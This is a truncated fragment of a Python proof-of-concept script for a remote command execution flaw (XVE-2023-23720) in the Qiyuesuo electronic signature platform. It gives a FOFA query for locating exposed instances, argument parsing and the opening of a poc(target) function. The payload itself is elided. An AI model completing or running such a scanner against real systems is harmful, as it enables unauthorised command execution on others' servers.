#契约锁电子签章平台 add 远程命令执行漏洞(XVE-2023-23720)
#fofa:app="契约锁-电子签署平台"
...
def main():
    banner()
    parse = argparse.ArgumentParser(description="契约锁电子签章平台 add 远程命令执行漏洞(XVE-2023-23720)")
...
def poc(target):
    ...
    headers = {
        'User-Agent':'Mozilla/5.0(Macintosh;IntelMacOSX10_12_6)AppleWebKit/537.36(KHTML,likeGecko)Chrome/98.0.155.44Safari/537.36',
